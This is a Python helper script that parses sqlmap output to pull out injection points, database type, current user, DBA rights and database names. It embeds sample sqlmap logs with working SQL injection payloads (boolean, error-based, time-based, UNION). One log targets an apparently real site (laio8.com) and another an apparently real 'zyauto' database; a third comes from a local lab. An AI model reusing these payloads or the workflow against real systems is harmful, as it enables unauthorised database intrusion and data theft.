# -*- coding:utf-8 -*-
#__author__:langzi
#__blog__:www.langzi.fun
import subprocess
import time
import os
import re

def writedata(x):
    with open('log.txt', 'a+')as aa:
        aa.write('***********************************' + '\n')
        aa.write(str(time.strftime('%Y-%m-%d:%H:%M:%S   ', time.localtime())) + x + '\n')
def Check_Inj_Result(content):
    # 检查是否存在注入，如果存在则返回内容，不存在返回None
    if 'use only' in content and '---' in content:
        return 'ACCESS'
    if '---' in content:
        return 'MYSQL'


def Common_Database(content):
    # if Check_Inj_Result(content):
    #     print('存在注入，开始获取通用数据')
    # 这里的判断可以在调用函数中做判断，方便后期维护
    try:
        result_info = re.search('---(.*?)---.*?\[INFO\] (the back-end DBMS is .*?)\[', content, re.S)
        inj = result_info.group(1)
        dbs = result_info.group(2)
        print(inj.replace('Parameter: ', '注入参数(方式) : ').replace('Type: ', '注入方式 : ').replace('Title: ',
                                                                                             '注入标题 : ').replace(
            'Payload: ', '注入攻击 : ') + '\n')
        print('---------')
        print(dbs.replace('the back-end DBMS is ', '数据库类型 : ').replace('web server operating system: ',
                                                                       '服务器版本 : ').replace(
            'web application technology: ', '服务器语言 : ').replace('back-end DBMS: ', '数据库版本 : ') + '\n')
    except Exception as e:
        writedata(str(e))

def Mysql_Database(content):
    try:
    # 获取当前用户，当前数据库，是否为dba权限
        current_user_grep = re.search('(current user:.*?)\[', content, re.S)
        current_user = current_user_grep.group(1).replace('current user', '当前用户')
        print(current_user)
    except Exception as e:
        writedata(str(e))

    try:
        current_db_grep = re.search('(current database:.*?)\[', content, re.S)
        current_db = current_db_grep.group(1).replace('current database', '当前数据库')
        print(current_db)
    except Exception as e:
        writedata(str(e))

    try:
        is_dba_grep = re.search('(current user is DBA:.*?)\[', content, re.S)
        is_dba = is_dba_grep.group(1)
        print(is_dba.replace('current user is DBA', '是否有DBA权限'))
    except Exception as e:
        writedata(str(e))

    try:
        # 获取所有的数据库
        all_dbs_grep = re.search('available databases.*?:(.*?)\[\d', content, re.S)
        all_dbs = all_dbs_grep.group(1)
        print('所有数据库:{}'.format(all_dbs))
    except Exception as e:
        writedata(str(e))

def Get_Column(content):
    try:
        all_column_grep = re.search('(Database: .*?\[.*?)\[\d',content,re.S)
        all_column = all_column_grep.group(1)
        print('数据库下列名')
        print(all_column)
    except Exception as e:
        writedata(str(e))


def Get_Mysql_Current_Data_Name(content):
    # 如果获取到当前数据库名称，就返回当前数据库名称，不然则返回None
    current_db = re.search('current database:(.*?)\[', content, re.S).group(1)
    current_db = (current_db.strip().replace("'",''))
    print(current_db)
    if current_db:
        return current_db
    else:
        return None

#
# content = '''
#         ___
#        __H__
#  ___ ___[,]_____ ___ ___  {1.2.11.6#dev}
# |_ -| . [)]     | .'| . |
# |___|_  ["]_|_|_|__,|  _|
#       |_|V          |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 13:39:20 /2019-05-02/
#
# [13:39:21] [INFO] testing connection to the target URL
# [13:39:21] [INFO] checking if the target is protected by some kind of WAF/IPS
# [13:39:21] [INFO] testing if the target URL content is stable
# [13:39:22] [INFO] target URL content is stable
# [13:39:22] [INFO] testing if GET parameter 'id' is dynamic
# [13:39:22] [INFO] GET parameter 'id' appears to be dynamic
# [13:39:23] [WARNING] reflective value(s) found and filtering out
# [13:39:23] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
# [13:39:23] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
# [13:39:23] [INFO] testing for SQL injection on GET parameter 'id'
# [13:39:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
# [13:39:26] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
# it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
# for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
# [13:39:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
# [13:39:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
# [13:39:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
# [13:39:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
# [13:39:28] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
# [13:39:28] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
# [13:39:28] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
# [13:39:29] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
# [13:39:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
# [13:39:30] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
# [13:39:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
# [13:39:30] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
# [13:39:30] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
# [13:39:30] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
# [13:39:31] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
# [13:39:31] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
# [13:39:31] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
# [13:39:31] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
# [13:39:31] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
# [13:39:31] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
# [13:39:31] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
# [13:39:31] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
# [13:39:31] [INFO] testing 'MySQL inline queries'
# [13:39:31] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
# [13:39:31] [INFO] testing 'MySQL > 5.0.11 stacked queries'
# [13:39:31] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
# [13:39:32] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
# [13:39:32] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
# [13:39:32] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
# [13:39:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
# [13:40:37] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind'
# [13:41:38] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 OR time-based blind' injectable
# [13:41:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
# [13:41:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
# [13:41:38] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
# [13:41:39] [INFO] target URL appears to have 5 columns in query
# [13:41:44] [INFO] target URL appears to be UNION injectable with 5 columns
# [13:41:47] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
# [13:41:47] [WARNING] automatically patching output having last char trimmed
# GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
# sqlmap identified the following injection point(s) with a total of 86 HTTP(s) requests:
# ---
# Parameter: id (GET)
#     Type: boolean-based blind
#     Title: AND boolean-based blind - WHERE or HAVING clause
#     Payload: id=49' AND 2376=2376 AND 'Ixlq'='Ixlq
#
#     Type: AND/OR time-based blind
#     Title: MySQL >= 5.0.12 OR time-based blind
#     Payload: id=49' OR SLEEP(5) AND 'XwMM'='XwMM
#
#     Type: UNION query
#     Title: Generic UNION query (NULL) - 5 columns
#     Payload: id=49' UNION ALL SELECT CONCAT(0x716a6b6271,0x64586a69694346484675567574676c735a736d737264537044685a4d474c51455048734a57636c58,0x717a6b7071),NULL,NULL,NULL,NULL-- BwhA
# ---
# [13:41:47] [INFO] the back-end DBMS is MySQL
# web server operating system: Windows 2003 or XP
# web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17
# back-end DBMS: MySQL >= 5.0.12
# [13:41:47] [INFO] fetching current user
# current user:    'zyauto@localhost'
# [13:41:49] [INFO] fetching current database
# current database:    'zyauto'
# [13:41:49] [INFO] testing if current user is DBA
# [13:41:49] [INFO] fetching current user
# [13:41:49] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
# current user is DBA:    False
# [13:41:49] [INFO] fetching database users password hashes
# [13:41:49] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
# [13:41:49] [WARNING] the SQL query provided does not return any output
# [13:41:49] [INFO] fetching database users
# [13:41:50] [INFO] fetching number of password hashes for user 'zyauto'
# [13:41:50] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
# [13:41:50] [INFO] retrieved:
# [13:41:50] [INFO] retrieved:
# [13:41:50] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
#
# [13:41:51] [WARNING] unable to retrieve the number of password hashes for user 'zyauto'
# [13:41:51] [ERROR] unable to retrieve the password hashes for the database users (probably because the DBMS current user has no read privileges over the relevant system database table(s))
# [13:41:51] [INFO] fetching database names
# available databases [2]:
# [*] information_schema
# [*] zyauto
#
#
# [*] ending @ 13:41:51 /2019-05-02/
#
# '''
#
# content1 = '''
#
# [14:44:43] [INFO] tried 3318/3321 items (100%)
# [14:44:43] [INFO] tried 3319/3321 items (100%)
# [14:44:43] [INFO] tried 3320/3321 items (100%)
# [14:44:43] [INFO] tried 3321/3321 items (100%)
# Database: SQLite_masterdb
# [10 tables]
# +----------+
# | CATEGORY |
# | MEMBER   |
# | ORDERS   |
# | ad       |
# | feedback |
# | job      |
# | links    |
# | manager  |
# | menu     |
# | room     |
# +----------+
#
# [14:44:43] [I
# '''


content = '''

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:18:33 /2019-05-02/

[15:18:33] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.1 Safari/532.2' from figents.txt'
custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[15:18:34] [INFO] resuming back-end DBMS 'mysql' 
[15:18:34] [INFO] testing connection to the target URL
[15:18:34] [INFO] heuristics detected web page charset 'ascii'
[15:18:34] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: http://www.laio8.com:80/xinwens/834) RLIKE (SELECT (CASE WHEN (4512=4512) THEN 834 ELSE 0x28 END))-- YvQe.html

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://www.laio8.com:80/xinwens/834) AND (SELECT 8690 FROM(SELECT COUNT(*),CONCAT(0x7162627171,(SELECT (ELT(8690=8690,1))),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- pVAw.html

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: http://www.laio8.com:80/xinwens/834) AND SLEEP(5)-- CYfZ.html
---
[15:18:34] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.4.45, Apache
back-end DBMS: MySQL >= 5.0
[15:18:34] [INFO] fetching current user
[15:18:34] [WARNING] reflective value(s) found and filtering out
current user:	None
[15:18:35] [INFO] fetching current database
current database:	None
[15:18:35] [INFO] testing if current user is DBA
[15:18:35] [INFO] fetching current user
current user is DBA:    False
[15:18:35] [INFO] fetching database users password hashes
[15:18:35] [WARNING] the SQL query provided does not return any output
[15:18:35] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[15:18:35] [INFO] fetching database users
[15:18:36] [WARNING] the SQL query provided does not return any output
[15:18:36] [INFO] fetching number of database users
[15:18:36] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval

[15:18:36] [INFO] retrieved: 

[15:18:36] [INFO] retrieved: [15:18:36] [WARNING] time-based comparison requires larger statistical model, please wait............ (done)
[15:18:37] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[15:18:37] [CRITICAL] unable to retrieve the number of database users
[15:18:37] [INFO] fetching database names
[15:18:38] [WARNING] the SQL query provided does not return any output
[15:18:38] [INFO] fetching number of databases

[15:18:38] [INFO] retrieved: 

[15:18:38] [INFO] retrieved: 
[15:18:38] [ERROR] unable to retrieve the number of databases
[15:18:38] [INFO] falling back to current database
[15:18:38] [INFO] fetching current database
[15:18:38] [CRITICAL] unable to retrieve the database names


'''
content = '''


[15:40:14] [INFO] resuming back-end DBMS 'mysql' 
[15:40:14] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 7799=7799 AND 'MlEh'='MlEh

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 5007 FROM(SELECT COUNT(*),CONCAT(0x7162787171,(SELECT (ELT(5007=5007,1))),0x7178717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'KrmZ'='KrmZ

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1' AND SLEEP(5) AND 'FQxo'='FQxo

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-1660' UNION ALL SELECT NULL,NULL,CONCAT(0x7162787171,0x737a747579654d65774d434c724d6176436c4f42764f634b52676c634e596d4d704e4364744d4671,0x7178717671)-- rEXq
---
[15:40:14] [INFO] the back-end DBMS is MySQL
web server operating system: Windows
web application technology: Apache 2.4.23, PHP 5.5.38
back-end DBMS: MySQL >= 5.0
[15:40:14] [INFO] fetching current user
current user:    'root@localhost'
[15:40:14] [INFO] fetching current database
current database:    'security'
[15:40:14] [INFO] testing if current user is DBA
[15:40:14] [INFO] fetching current user
current user is DBA:    True
[15:40:14] [INFO] fetching database names
[15:40:14] [INFO] used SQL query returns 11 entries
[15:40:14] [INFO] resumed: information_schema
[15:40:14] [INFO] resumed: challenges
[15:40:14] [INFO] resumed: dvwa
[15:40:14] [INFO] resumed: dwvs
[15:40:14] [INFO] resumed: lang_cms_finds
[15:40:14] [INFO] resumed: mysql
[15:40:14] [INFO] resumed: performance_schema
[15:40:14] [INFO] resumed: phpmyadmin
[15:40:14] [INFO] resumed: pikachu
[15:40:14] [INFO] resumed: security
[15:40:14] [INFO] resumed: test
available databases [11]:
[*] challenges
[*] dvwa
[*] dwvs
[*] information_schema
[*] lang_cms_finds
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] pikachu
[*] security
[*] test

[15:40:14] [INFO] fetched data logged to text files un.0.1'
[*] ending @ 15:27:23 /2019-05-02/
'''

Get_Mysql_Current_Data_Name(content)